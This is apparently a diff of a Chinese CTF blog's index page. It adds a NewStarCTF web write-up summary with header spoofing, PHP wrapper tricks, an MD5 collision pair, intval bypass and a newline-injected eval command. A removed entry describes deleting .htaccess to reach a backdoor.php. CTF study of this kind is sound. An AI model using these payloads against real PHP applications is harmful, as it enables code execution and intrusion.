@@ -110,6 +110,23 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/newstarctf-web/">NewStarCTF-web</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week1 HTTP cookie 修改admin 源码发现key GET和POST传参即可
+Head?Header! User-Agent: CTFReferer: ctf.comX-Forwarded-For: 127.0.0.1 我真的会谢 信息泄露
+robots.txt
+www.zip
+源码 + /.index.php.swp
+NotPHP 函数绕过 if(file_get_contents($_GET[&#39;data&#39;]) == &#34;Welcome to CTF&#34;){ if(md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]){ if(!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) == 2077){ echo &#34;Hack Me&#34;; eval(&#34;#&#34;.$_GET[&#39;cmd&#39;]); }else{ die(&#34;Number error!&#34;); } }else{ die(&#34;Wrong Key!&#34;); } }else{ die(&#34;Pass it!&#34;); 1,绕过file_get_contents()，用input伪协议，即 /?data=php://input POST一个Welcome to CTF
+用data协议绕，?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=
+2,md5强比较碰撞&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 这里可以直接数组绕过 key1[]=1&amp;key2[]=2
+3，绕数字判断，intval只取前面的数字，后面的字母会忽略
+num=2077abc
+4，绕# 命令执行，用回车符%0d，我用换行符%0a打不通不知道为啥
+&amp;cmd=%0dsystem(&quot;ls /&quot;); 在bp里需要URL编码进去rec</div><div class="post-footer">
+        <a href="/posts/ctf/newstarctf-web/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/nodejs/">nodejs</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。
@@ -181,20 +198,6 @@ https://github.com/jas502n/Grafana-CVE-2021-43798获取数据库密码
 secret_key = SW2YcwTIb9zpO1hoPsMm 拿github的工具解密需要go环境</div><div class="post-footer">
         <a href="/posts/ctf/%E5%AD%97%E8%8A%82ctf/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/grafana/">Grafana</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/">强网拟态wp</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web noumisotuitennnoka 本地测一下，确实是，执行了默认的create 、zip 、unzip后
-会在/var/www/html目录下生成jsons文件夹，里面就是backdoor.php 和 .hatccess
-刚开始想通过clean把/var/www/html/jsons/.htaccess 删掉，但是$substr的正则匹配拦住了，绕不过。
-换个思路，通过'remove_path' =&gt; $dev_dir 来清除。
-要满足realpath($dev_dir) == $dir 并且 删除.htaccess
-可以构造dev=/tmp/. 这里是重点，这样就可以在压缩过程中删除.htaccess了。
-所以创建和解压也用/tmp作为目录
-?action=create&amp;subdir=/tmp?action=zip&amp;subdir=/tmp&amp;dev=/tmp/.?action=unzip&amp;subdir=/tmp 解压后就没有.htaccess了
-直接访问backdoor.php</div><div class="post-footer">
-        <a href="/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -225,12 +228,12 @@ secret_key = SW2YcwTIb9zpO1hoPsMm 拿github的工具解密需要go环境</div><d
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/11/">11</a>
+                        <a href="/page/12/">12</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
